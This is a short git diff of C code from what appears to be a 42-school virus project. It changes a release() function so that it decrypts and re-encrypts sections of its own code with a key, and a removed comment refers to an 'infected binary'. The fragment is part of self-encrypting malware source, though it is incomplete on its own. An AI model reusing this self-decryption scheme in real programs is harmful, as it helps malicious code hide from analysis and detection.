@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 12:22:54 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 17:19:31 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,7 +17,8 @@
 */
 void		release(t_data *data)
 {
-	/* revert_two(&data->key, (char*)inject, (size_t)release - (size_t)patch); */
+
+	revert_two(&data->key, (char*)patch, (size_t)release - (size_t)patch);
 
 #ifdef DEBUG
 	char de[] = "release\t\t0\n";
@@ -45,10 +46,10 @@ void		release(t_data *data)
 		_exit(0);
 	}
 
-	/* disabled due to mysterious segfault in infected binary that pop out of nowhere */
-	/* update_two(&data->key, (char*)release, (size_t)end - (size_t)release); */
-	/* revert_two(&data->key, (char*)end, (size_t)update_one - (size_t)end); */
-
 next:
-	end(data);
+
+	update_two(&data->key, (char*)release, (size_t)erase - (size_t)release);
+	revert_two(&data->key, (char*)erase, (size_t)end - (size_t)erase);
+
+	erase(data);
 }
